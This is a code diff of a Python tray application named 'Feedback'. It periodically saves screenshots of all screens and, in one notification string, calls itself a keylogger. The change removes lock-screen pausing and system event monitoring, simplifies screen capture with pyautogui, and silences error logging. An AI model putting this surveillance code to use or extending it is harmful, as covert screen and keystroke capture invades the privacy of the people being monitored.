@@ -1,3 +1,5 @@
+# now screenshot is working fine after 2.1.1 update 
+
 import os
 import re
 import sys
@@ -28,11 +30,6 @@ from PIL import Image, ImageDraw
 from tkinter import PhotoImage, ttk, messagebox
 from datetime import datetime, timedelta
 from pystray import Icon, Menu, MenuItem
-import win32api
-import win32con
-import win32gui
-from PIL import ImageGrab
-import gc
 
 # Global variables
 APP_NAME = "Feedback"
@@ -1206,28 +1203,18 @@ def take_screenshot():
     while True:
         try:
             if is_running:
-                # Check if workstation is locked
-                if ctypes.windll.user32.GetForegroundWindow() == 0:
-                    logging.info("Skipping screenshot - workstation locked")
-                    time.sleep(10)
-                    continue
-                    
                 timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
                 filename = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
-                
-                # Use smaller region capture and optimize memory
-                with ImageGrab.grab(all_screens=True, xdisplay="") as img:
-                    img.save(filename, optimize=True, quality=85)
-                
+                pyautogui.screenshot(filename)
                 logging.info(f"take_screenshot-->Screenshot saved: {filename}")
-                
+                print(f"📂 Screenshot saved: {filename}")
             with lock:
-                current_interval = screenshot_interval
+                current_interval = screenshot_interval   # Ensure thread-safe interval update
             time.sleep(current_interval)
-            
         except Exception as e:
-            logging.error(f"Screenshot error: {str(e)}")
-            time.sleep(30)  # Backoff on errors
+            # logging.error(f"Error taking screenshot: {e}")
+            print(f"Error taking screenshot: {e}")
+            pass
 
 
 # Toggle screenshot taking
@@ -2594,9 +2581,6 @@ def main():
         # Start a background thread to check for updates at regular intervals
         threading.Thread(target=start_auto_update_checker, daemon=True).start()
         
-        # Add system event monitoring
-        system_monitor_thread = threading.Thread(target=system_event_monitor, daemon=True)
-        system_monitor_thread.start()
         
     except KeyboardInterrupt:
         show_notification(APP_NAME, "Keylogger is closing...")
@@ -2622,22 +2606,6 @@ def clean_temp_files():
             except Exception as e:
                 logging.warning(f"Failed to clean temp file {file}: {str(e)}")
 
-# Add system event monitoring
-def system_event_monitor():
-    """Monitor system events like lock/unlock"""
-    while True:
-        # Check for session lock state
-        hDesktop = win32gui.OpenDesktop("Winlogon", 0, False, win32con.DESKTOP_SWITCHDESKTOP)
-        if hDesktop:
-            logging.info("Workstation locked - pausing activities")
-            # Pause non-essential operations
-            global is_running
-            is_running = False
-            win32gui.CloseDesktop(hDesktop)
-            time.sleep(10)
-        else:
-            is_running = True
-            time.sleep(5)
 
 if __name__ == "__main__":
     main()
